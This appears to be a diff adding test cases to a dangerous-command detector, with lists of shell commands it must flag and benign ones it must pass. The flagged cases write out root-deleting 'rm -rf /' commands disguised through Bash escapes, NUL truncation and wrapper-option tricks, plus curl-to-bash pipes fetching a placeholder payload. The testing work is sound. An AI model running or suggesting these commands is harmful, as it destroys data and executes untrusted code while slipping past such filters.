@@ -107,10 +107,25 @@ MUST_FLAG_DANGER = [
     "rm -rf $'/'",                        # shlex doesn't decode bash's $'...' ANSI-C quoting
     r"rm -rf $'\057'",                    # Bash octal escape for '/'
     r"rm -rf $'\x2f'",                    # Bash hexadecimal escape for '/'
+    r"rm -rf $'\457'",                    # Bash wraps octal escapes to one byte
+    r"rm -rf $'\057\0ignored'",           # Bash truncates the ANSI-C expansion at NUL
+    r"rm -rf $'\x2f\x00ignored'",
+    r"rm -rf $'\057\400ignored'",         # 0400 wraps to NUL before Bash builds argv
+    "rm -rf $'/\\0\\\nignored'",         # escaped newline must not prevent ANSI-C decoding
+    r"bash -c $'rm -rf /\0ignored'",
     "sudo -u root rm -rf /",              # wrapper's OWN option, not just its name, was left unstripped
     "sudo --user root rm -rf /",
+    "sudo --u root rm -rf /",             # sudo accepts unambiguous long-option abbreviations
+    "sudo -Eu root rm -rf /",              # value-taking short option at the end of a bundle
+    "sudo -a bsdauth rm -rf /",            # conditional BSD-auth option still consumes a value
+    "doas -a passwd rm -rf /",
+    "sudo FOO=bar -u root rm -rf /",       # sudo resumes option parsing after assignments
+    "sudo FOO=bar --u root rm -rf /",
     "sudo -E rm -rf /",
     "env -i rm -rf /",
+    "env -iu FOO rm -rf /",
+    "env -P /usr/bin rm -rf /",
+    "env -iS 'rm -rf /'",
     "env --unset FOO rm -rf /",
     "env --chdir /tmp rm -rf /",
     "env -a fake rm -rf /",
@@ -119,10 +134,21 @@ MUST_FLAG_DANGER = [
     "nice -n19 rm -rf /",
     "nice -n 19 rm -rf /",
     "nice --adjustment 10 rm -rf /",
+    "nice --adj 10 rm -rf /",
     "ionice -c3 rm -rf /",
     "stdbuf -oL rm -rf /",
     "stdbuf --output L rm -rf /",
     "exec -a fake rm -rf /",
+    "curl https://payload.invalid/install | timeout --sig KILL 5 /bin/bash",
+    "curl https://payload.invalid/install | timeout -vs KILL 5 /bin/bash",
+    "curl https://payload.invalid/install | env --spl='/bin/bash'",
+    "find / -print0 | xargs -0n 1 rm -rf",
+    "find / -print0 | xargs -J % rm -rf",
+    "find / -print0 | xargs -R 1 rm -rf",
+    "find / -print0 | xargs -S 255 rm -rf",
+    "find / -print0 | xargs --replace rm -rf /",
+    "find / -print0 | xargs --rep rm -rf /",
+    "find / -print0 | xargs -iI rm -rf /",
     "busybox rm -rf /",                   # applet dispatcher, not just a cosmetic wrapper
     "toybox rm -rf /",
     "find / -type f | xargs rm -rf",      # target comes from the pipe, not the command line
@@ -189,10 +215,28 @@ MUST_BE_CLEAN_OF_DANGER = [
     "env FOO=1 python3 app.py",
     r"env -S 'printf a\ b'",
     "env --unset FOO python3 app.py",
+    "env --u FOO python3 app.py",
     "env --chdir /tmp ls -la",
     "sudo --user root systemctl restart nginx",
+    "sudo --u root systemctl restart nginx",
+    "sudo -Eu root systemctl restart nginx",
+    "sudo -a bsdauth systemctl restart nginx",
+    "doas -a passwd id",
+    "sudo FOO=bar -u root systemctl restart nginx",
     "nice -n 10 make -j4",
     "nice --adjustment 10 make -j4",
+    "nice --adj 10 make -j4",
+    "timeout --sig TERM 5 sleep 1",
+    "timeout -vs TERM 5 sleep 1",
+    "env -iu FOO python3 app.py",
+    "env -P /usr/bin python3 app.py",
+    "env -iS 'printf ok'",
+    "printf 'x\n' | xargs -0n 1 echo",
+    "printf 'x\n' | xargs -R 1 echo",
+    "printf 'x\n' | xargs -S 255 echo",
+    "printf 'x\n' | xargs --replace echo {}",
+    "printf 'x\n' | xargs -iI echo I",
+    r"read -r -d $'\0' item",
     'sh -c "ls -la"',
     'bash -c "echo hi"',
     "shred -u ./secret.txt",
@@ -209,6 +253,7 @@ MUST_BE_CLEAN_OF_DANGER = [
     "nice -n 10 rm -rf ./build",          # a wrapper's value option must not eat the real verb
     "find . -type f -name '*.log' | xargs rm",   # ordinary root, not a critical one
     "rm -rf ~/downloads/old",             # '~/word' is an ordinary subpath, not '..' escaping it
+    r"rm -rf $'/\0ignored'home/user/project/build",  # Bash target is the ordinary /home/... path
     # --- fourth round: the new "unscoped delete" and tee/dd rules must not
     # fire on ordinary, deliberately-scoped commands.
     "cd ./build && rm -rf *",
